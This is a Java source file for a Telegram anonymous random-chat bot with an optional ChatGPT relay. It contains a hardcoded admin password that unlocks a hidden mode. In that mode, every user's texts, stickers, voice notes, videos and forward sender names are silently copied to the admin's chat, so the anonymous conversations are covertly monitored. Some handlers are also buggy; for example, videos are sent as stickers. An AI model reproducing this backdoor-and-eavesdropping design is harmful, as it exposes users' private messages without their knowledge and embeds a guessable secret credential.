package com.bot.firstbot.service;

import com.bot.firstbot.config.BotConfig;
import org.json.JSONException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendSticker;
import org.telegram.telegrambots.meta.api.methods.send.SendVoice;
import org.telegram.telegrambots.meta.api.objects.*;
import org.telegram.telegrambots.meta.api.objects.stickers.Sticker;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.IOException;
import java.util.*;

@Component
public class TelegramBot extends TelegramLongPollingBot {
    @Autowired
    BotConfig config;
    private Map<Long, Long> idUser = new HashMap<>();
    long chatId;
    long interlocutor;
    boolean zxc = true;
    private List<Long> list = new ArrayList<>();
    int id;

    boolean adminMode=false;
    boolean gptMode=false;

    private long chatIdAdmin;

    @Override
    public void onUpdateReceived(Update update) {
        chatId = update.getMessage().getChatId();
        System.out.println(chatId);
        int asd = 0;
        for (Long ic : list) {

            if (ic != chatId) {
                id = asd;
            }
            asd++;
        }
        if (update.hasMessage() && update.getMessage().hasText()) {

            if (list.size() > 1) {
                sendMessage(update.getMessage().getSticker(), list.get(id));
                sendMessage(update.getMessage().getSticker(), chatIdAdmin);
                sendMessage(update.getMessage().getText(), list.get(id));
                sendMessage(update.getMessage().getText(), chatIdAdmin);
                sendMessage(update.getMessage().getForwardSenderName(), chatIdAdmin);
                sendMessage(update.getMessage().getVoice(), list.get(id));
                sendMessage(update.getMessage().getVoice(), chatIdAdmin);
                sendMessage(update.getMessage().getVideo(), list.get(id));
                sendMessage(update.getMessage().getVideo(), chatIdAdmin);
            }
            System.out.println(update.getMessage());
            System.out.println(update.getMessage().getText());
            if (update.getMessage().getText().equals("/admin")) {
                sendMessage("enter password", chatId);
                adminMode=true;
            }
            if (update.getMessage().getText().equals("/closegpt")) {
                sendMessage("gpt close", chatId);
                gptMode=false;
            }
            if (update.getMessage().getText().equals("/gpt")) {
                gptMode=true;
            }

            if(update.getMessage().getText().equals("zxcursed1232")&&adminMode){
                sendMessage("successfully", chatId);
                chatIdAdmin=chatId;

            }
            if (update.getMessage().getText().equals("/stop")) {
                list.remove(chatId);
            }
            if (update.getMessage().getText().equals("/next")) {
                randomId(chatId);
            }
            if (update.getMessage().getText().equals("/start")) {
                if (list.contains(chatId)) {
                    randomId(chatId);
                } else {
                    list.add(chatId);
                    randomId(chatId);
                }
            }
            if (update.getMessage().getText().equals("/listsize")) {
                sendMessage(String.valueOf(list.size()), chatId);
                sendMessage(list.toString(), chatId);
            }
            if(gptMode){
                try {
                    sendMessage(HttpC.chatGpT(update.getMessage().getText()),chatId);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
            }
        }

    }

    @Override
    public String getBotUsername() {
        return config.getBotName();
    }

    @Override
    public String getBotToken() {
        return config.getBotToken();
    }

    public void sendMessage(String text, long catId) {
        SendMessage message = new SendMessage();
        message.setChatId(catId);
        message.setText(text);
        try {
            execute(message);
        } catch (TelegramApiException e) {
        }
    }

    public void sendMessage(Voice text, long catId) {
        SendVoice message = new SendVoice();
        message.setChatId(catId);
        message.setVoice(new InputFile(String.valueOf(text)));
        try {
            execute(message);
        } catch (TelegramApiException e) {
        }
    }

    public void sendMessage(Sticker text, long catId) {
        SendSticker message = new SendSticker();
        message.setChatId(catId);
        message.setSticker(new InputFile(String.valueOf(text)));
        try {
            execute(message);
        } catch (TelegramApiException e) {
        }
    }

    public void sendMessage(Video text, long catId) {
        SendSticker message = new SendSticker();
        message.setChatId(catId);
        message.setSticker(new InputFile(String.valueOf(text)));
        try {
            execute(message);
        } catch (TelegramApiException e) {
        }
    }

    public int randomInterval(int intr) {
        Random random = new Random();
        return random.nextInt(intr);
    }

    public long randomId(long id) {
        boolean l = true;
        long ccc = 0;
        while (l) {
            ccc = list.get(randomInterval(list.size()));
            if (ccc != chatId || list.size() == 1) l = false;

        }
        return ccc;
    }
}